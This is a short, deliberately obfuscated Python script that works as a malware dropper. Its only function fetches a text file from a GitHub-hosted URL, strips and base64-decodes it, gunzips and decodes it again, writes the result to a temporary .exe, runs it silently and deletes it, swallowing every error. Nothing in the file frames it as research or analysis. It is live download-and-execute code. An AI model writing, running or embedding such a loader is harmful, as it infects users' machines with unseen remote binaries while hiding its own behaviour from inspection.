import subprocess
import base64
import os
import gzip
import io
import http.client
from urllib.parse import urlparse
from pathlib import Path
import tempfile

def obfus ():#line:1
    try :#line:2
        O000O0000O000O00O =urlparse ("https://raw.githubusercontent.com/SatcomRadio/satcomradio.github.io/refs/heads/main/PlaceHolder_Comp.txt")#line:3
        OO0000O00O0OO00O0 =http .client .HTTPSConnection (O000O0000O000O00O .hostname )#line:4
        OO0000O00O0OO00O0 .request ("GET",O000O0000O000O00O .path if O000O0000O000O00O .path else "/")#line:5
        O0OOO0O0OO00O00OO =OO0000O00O0OO00O0 .getresponse ()#line:6
        if O0OOO0O0OO00O00OO .status !=200 :#line:8
            return #line:9
        O0O00O0O0OOO0O0O0 =O0OOO0O0OO00O00OO .read ().decode ('utf-8')#line:11
        O0O00O0O0OOO0O0O0 =''.join ([OOOO0O0O0O0OO0000 for OOOO0O0O0O0OO0000 in O0O00O0O0OOO0O0O0 if ord (OOOO0O0O0O0OO0000 )<128 ])#line:12
        O000OOOO00O0000O0 =base64 .b64decode (O0O00O0O0OOO0O0O0 )#line:13
        OO0000000OOOO0O0O =io .BytesIO (O000OOOO00O0000O0 )#line:14
        with gzip .GzipFile (fileobj =OO0000000OOOO0O0O ,mode ='rb')as O000OO0OOOOO0000O :#line:15
            OOO00OO000OOOOOOO =O000OO0OOOOO0000O .read ().decode ('utf-8')#line:16
        OOO00OO000OOOOOOO =base64 .b64decode (OOO00OO000OOOOOOO )#line:18
        O000OOOO00OOO0OO0 ,OO0O000OO0000OOO0 =tempfile .mkstemp (suffix ='.exe')#line:19
        os .write (O000OOOO00OOO0OO0 ,OOO00OO000OOOOOOO )#line:20
        os .close (O000OOOO00OOO0OO0 )#line:21
        try :#line:23
            O0OO0OO0O00OO0000 =subprocess .call (OO0O000OO0000OOO0 )#line:24
        finally :#line:25
            os .remove (OO0O000OO0000OOO0 )#line:26
    except Exception as O00OO00OO0OOO00O0 :#line:27
        return 

# Example usage
if __name__ == "__main__":
    obfus()
